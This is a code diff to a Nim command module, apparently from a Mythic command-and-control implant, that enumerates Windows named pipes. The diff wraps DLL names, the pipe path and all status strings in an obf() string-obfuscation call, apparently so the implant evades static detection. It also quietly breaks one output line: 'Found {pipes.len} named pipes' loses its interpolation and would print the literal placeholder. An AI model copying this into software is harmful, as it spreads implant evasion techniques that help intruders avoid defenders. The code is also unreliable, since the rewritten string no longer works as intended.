@@ -1,18 +1,19 @@
 import ../utils/mythic_responses
 import ../utils/debug
+import ../utils/strenc
 import std/[json, strformat, strutils]
 
 when defined(windows):
   import winim/lean
   
   proc FindFirstFileW(lpFileName: LPCWSTR, lpFindFileData: ptr WIN32_FIND_DATAW): HANDLE 
-    {.importc, dynlib: "kernel32.dll", stdcall.}
+    {.importc, dynlib: obf("kernel32.dll"), stdcall.}
   
   proc FindNextFileW(hFindFile: HANDLE, lpFindFileData: ptr WIN32_FIND_DATAW): WINBOOL 
-    {.importc, dynlib: "kernel32.dll", stdcall.}
+    {.importc, dynlib: obf("kernel32.dll"), stdcall.}
   
   proc FindClose(hFindFile: HANDLE): WINBOOL 
-    {.importc, dynlib: "kernel32.dll", stdcall.}
+    {.importc, dynlib: obf("kernel32.dll"), stdcall.}
 
 proc listpipes*(taskId: string, params: JsonNode): JsonNode =
   ## List all named pipes on the local system
@@ -23,7 +24,7 @@ proc listpipes*(taskId: string, params: JsonNode): JsonNode =
       var pipes: seq[string] = @[]
       
       # Define the search path for named pipes
-      let searchPath = newWideCString("\\\\.\\pipe\\*")
+      let searchPath = newWideCString(obf("\\\\.\\pipe\\*"))
       
       # Initialize the WIN32_FIND_DATAW structure
       var findData: WIN32_FIND_DATAW
@@ -33,7 +34,7 @@ proc listpipes*(taskId: string, params: JsonNode): JsonNode =
       
       if handle == INVALID_HANDLE_VALUE:
         let err = GetLastError()
-        return mythicError(taskId, &"FindFirstFileW failed with error code: {err}")
+        return mythicError(taskId, obf("FindFirstFileW failed with error code: ") & $err)
       
       # Enumerate all named pipes
       block enumLoop:
@@ -48,7 +49,7 @@ proc listpipes*(taskId: string, params: JsonNode): JsonNode =
             let err = GetLastError()
             if err != ERROR_NO_MORE_FILES:
               discard FindClose(handle)
-              return mythicError(taskId, &"FindNextFileW failed with error code: {err}")
+              return mythicError(taskId, obf("FindNextFileW failed with error code: ") & $err)
             break enumLoop
       
       # Close the search handle
@@ -58,13 +59,13 @@ proc listpipes*(taskId: string, params: JsonNode): JsonNode =
       
       # Prepare the response
       let output = if pipes.len == 0:
-        "No named pipes found."
+        obf("No named pipes found.")
       else:
-        &"Found {pipes.len} named pipes:\n" & pipes.join("\n")
+        obf("Found {pipes.len} named pipes:\n") & pipes.join("\n")
       
       return mythicSuccess(taskId, output)
       
     except Exception as e:
-      return mythicError(taskId, &"ListPipes error: {e.msg}")
+      return mythicError(taskId, obf("ListPipes error: ") & e.msg)
   else:
-    return mythicError(taskId, "listpipes command is only available on Windows")
+    return mythicError(taskId, obf("listpipes command is only available on Windows"))
